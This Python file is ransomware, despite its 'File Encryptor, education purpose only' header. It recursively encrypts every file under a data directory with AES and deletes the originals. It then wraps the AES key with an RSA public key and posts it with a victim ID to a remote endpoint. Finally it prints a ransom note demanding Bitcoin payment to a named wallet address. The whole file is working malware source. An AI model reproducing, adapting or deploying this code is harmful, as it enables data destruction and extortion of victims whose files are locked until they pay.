# File Encryptor
# Education purpose only
import codecs
import gc
import json
import os
import pickle
import uuid
from urllib.request import urlopen
import Crypto.Random
from Crypto.Cipher import AES, PKCS1_OAEP
from os import walk, rename
from os.path import isdir, isfile, join, splitext
from Crypto.PublicKey import RSA
from urllib import request
from rich.markdown import Markdown
from config import ENDPOINT
from rich.console import Console
from rich import print

key = Crypto.Random.get_random_bytes(32)
uid = str(uuid.uuid4())


def encrypt(file):
    global key
    f = open(file, 'rb')
    data = f.read()
    f.close()

    os.remove(file)
    base = os.path.splitext(file)[0]

    cipher = AES.new(key, AES.MODE_CFB)
    cipheredData = cipher.encrypt(data)

    with open(base + '.e2e', "wb+") as f:
        f.write(cipheredData)
        f.close()

    with open(base + '.e2eext', "w+") as f:
        f.write(os.path.splitext(file)[1])
        f.close()

    with open(base + '.e2eiv', "wb+") as f:
        f.write(cipher.iv)
        f.close()


def send():
    global key
    global uid
    #print(key)

    # f = open('../Server/database', 'w+')

    RSA_key = RSA.import_key(open("./pub.pem").read())
    session_key = Crypto.Random.get_random_bytes(16)

    # Encrypt the session key with the public RSA key
    cipher_rsa = PKCS1_OAEP.new(RSA_key)
    enc_session_key = cipher_rsa.encrypt(session_key)

    # Encrypt the data with the AES session key
    cipher_aes = AES.new(session_key, AES.MODE_EAX)
    ciphertext, tag = cipher_aes.encrypt_and_digest(key)

    # f.write(codecs.encode(pickle.dumps([x for x in (enc_session_key, cipher_aes.nonce, tag, ciphertext)]), "base64").decode())

    req = request.Request(ENDPOINT+'/add', headers={
        'Content-Type': 'application/json'
    }, data=bytes(json.dumps({
        'uid': uid,
        'key': codecs.encode(pickle.dumps([x for x in (enc_session_key, cipher_aes.nonce, tag, ciphertext)]), "base64").decode()
    }), 'utf-8'))
    urlopen(req)

    del key
    gc.collect()


def main():
    global uid
    for root, dirs, files in walk('./data'):
        for f in files:
            encrypt(join(root, f))

    send()

    console = Console()
    console.print(
        Markdown("# ️WARNING: Your files had been encrypted"),
        style='red'
    )

    console.print(
        Markdown("### How to decrypt?")
    )

    print(
        "Please Remember Your Device Token [b](%s)[/b]\n" % uid,
        "Send Bitcoin to [blue]%s[/blue] and follow the instruction" % "bc1qn2xl6e2n227nrxv54gnvg55pvmq43pkplgckh7",
        "When you have paid for the money, go to [link]%s[/link]" % ENDPOINT,
    )

if __name__ == '__main__':
    main()
